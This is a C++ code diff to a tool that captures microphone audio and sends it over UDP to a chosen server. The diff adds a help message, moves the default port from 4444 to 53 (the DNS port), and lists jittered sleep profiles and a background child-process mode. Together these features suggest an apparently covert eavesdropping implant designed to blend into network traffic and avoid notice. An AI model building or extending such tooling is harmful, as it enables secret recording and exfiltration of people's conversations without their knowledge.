@@ -15,6 +15,37 @@ int ArgToInt(const std::string& argName, const char* value) {
     }
 }
 
+void PrintHelp(const char* exe) {
+    std::cout <<
+        "Usage:\n"
+        "  " << exe << " [options]\n"
+        "\n"
+        "Options:\n"
+        "  --help                 Show this help message and exit\n"
+        "  --list                 List available microphones and exit\n"
+        "  --mic <index>          Microphone index to use (default: system default)\n"
+        "\n"
+        "  --server <ip>          Server IP address to send to (default: 127.0.0.1)\n"
+        "  --port <port>          UDP port to use (default: 53)\n"
+        "  --packet-size <bytes>  Client packet size in bytes (1–65355) (default: 1024)\n"
+        "\n"
+        "  --sleep <mode>         Sleep profile (0–4) (default: 2)\n"
+        "                         0 = 5–20s (Tiny)\n" 
+        "                         1 = 10–40s (Short)\n"
+        "                         2 = 20–60s (Normal)\n"
+        "                         3 = 40–100s (Long)\n"
+        "                         4 = 15–400s (Random)\n"
+        "\n"
+        "  --background           Run in the background (spawns a child process)\n"
+        "  --daemon               Internal: indicates the background child process\n"
+        "  --verbose              Enable verbose logging\n"
+        "\n"
+        "Examples:\n"
+        "  " << exe << " --list\n"
+        "  " << exe << " --mic 1 --server 192.168.1.10 --port 5353\n"
+        "  " << exe << " --packet-size 1400 --sleep 3 --background\n";
+}
+
 int main(int argc, char* argv[]) {
     bool runInBackground = false;
     bool isChildProcess = false;
@@ -26,10 +57,14 @@ int main(int argc, char* argv[]) {
     int packetSize = 1024;
     int sleepInput = 2;
     std::string ip_address = "127.0.0.1";
-    int port = 4444;
+    int port = 53;
     try {
         for (int i = 1; i < argc; i++) {
             std::string arg = argv[i];
+            if (arg == "--help") {
+                PrintHelp(argv[0]);
+                return 0;
+            }
             if (arg == "--background") {
                 runInBackground = true;
             }
@@ -107,6 +142,11 @@ int main(int argc, char* argv[]) {
 
     AM.SetIsVerbose(isVerbose);
 
+    if (!AM.Initialize()) {
+        std::cerr << "[ERROR] Initialization failed.\n";
+        return 1;
+    }
+
     // 3. Execution Flow
     if (listMicrophones) {
         AM.ListMicrophones();
@@ -120,11 +160,6 @@ int main(int argc, char* argv[]) {
 
     if (micIndex != -1) {
         AM.SelectMicrophoneFromInt(micIndex);
-    }
-
-    if (!AM.Initialize()) {
-        std::cerr << "[ERROR] Initialization failed.\n";
-        return 1;
     }
 
     AM.Start();
